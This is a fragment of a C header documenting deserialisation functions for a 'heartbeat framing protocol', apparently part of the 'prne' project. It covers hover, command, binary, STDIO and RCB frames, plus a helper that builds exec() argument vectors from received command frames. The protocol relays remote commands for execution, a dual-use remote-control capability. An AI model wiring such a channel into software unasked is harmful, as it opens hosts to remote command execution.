 * \param out The pointer to the object for output
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more input data is required for parsing
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_dser_hover (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_hover_t *out);
/**
 * \brief The deserialisation function for the heartbeat framing protocol
 * 	command frame
 * \param data The input binary data
 * \param len The byte length of the input binary data
 * \param actual The actual number of bytes processed or required
 * \param out The pointer to the object for output
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more input data is required for parsing
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_dser_cmd (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_cmd_t *out);
/**
 * \brief The deserialisation function for the heartbeat framing protocol binary
 * 	meta frame
 * \param data The input binary data
 * \param len The byte length of the input binary data
 * \param actual The actual number of bytes processed or required
 * \param out The pointer to the object for output
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more input data is required for parsing
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_bin_meta_t *out);
/**
 * \brief The deserialisation function for the heartbeat framing protocol STDIO
 * 	frame
 * \param data The input binary data
 * \param len The byte length of the input binary data
 * \param actual The actual number of bytes processed or required
 * \param out The pointer to the object for output
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more input data is required for parsing
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_dser_stdio (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_stdio_t *out);
/**
 * \brief The deserialisation function for the heartbeat protocol binary RCB
 * 	frame
 * \param data The input binary data
 * \param len The byte length of the input binary data
 * \param actual The actual number of bytes processed or required
 * \param out The pointer to the object for output
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more input data is required for parsing
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_dser_rcb (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_rcb_t *out);

/**
 * \brief Index the series of strings to create an argument vector
 * \param m_args The pointer to the series of strings
 * \param args_size The byte length of the buffer
 * \param add_argc The additional argument vector to prepend to the output
 * 	argument vector
 * \param add_args The number of elements in the additional argument vector
 * \param[out] argc The number of elements in the output argument vector
 * 	(optional)
 * \param max_args The maximum number of elements allowed in the output argument
 * 	vector. Use \c SIZE_MAX to disable this.
 * \return The fabricated NULL element terminated argument vector, which can be
 * 	passed directly to \c exec() Memory freeable with \c prne_free()
 * \retval NULL and \c errno set to \c EINVAL - a null-terminator is not found
 * 	at the end of \p m_args
 * \retval NULL and \c errno set to \c E2BIG - the limit set with \p max_args
 * 	reached.
 * \retval NULL and \c errno set to \c ENOMEM - memory allocation for the ouput
 * 	argument vector failed
 * \note The function is used to prepare the argument vector for \c exec() call.
 * 	The protocol is only responsible for the parametres and determining the file
 * 	name of the executable is up to the implementation. The function is for
 * 	parsing the linear argument vector from the heartbeat framing protocol
 * 	command frame and prepending the path of the executable.
 * \see \c exec()
 */
char **prne_htbt_parse_args (
	char *m_args,
	const size_t args_size,
	const size_t add_argc,
	char **add_args,
	size_t *argc,
	const size_t max_args);

/**
 * \brief Generate an integer for a new heartbeat framing protocol session
 * \param ctx The context object
 * \param rnd_f The PRNG callback function
 * \return A randomly generated unsigned 16-bit integer for a new session
 * \note This function is a convenience function for clamping the randomly
 * 	generated number into the range used by the protocol -
 * 	[ \c PRNE_HTBT_MSG_ID_MIN , \c PRNE_HTBT_MSG_ID_DELTA )
 */
uint16_t prne_htbt_gen_msgid (void *ctx, uint16_t(*rnd_f)(void*));

/**
 * \brief Convert the enum value to a string
 * \return The pointer to the string from the read-only static string pool.
 * \retval NULL if \p x is out of bounds and \c errno set to \c EINVAL
 */
const char *prne_htbt_serrc_tostr (const prne_htbt_ser_rc_t x);
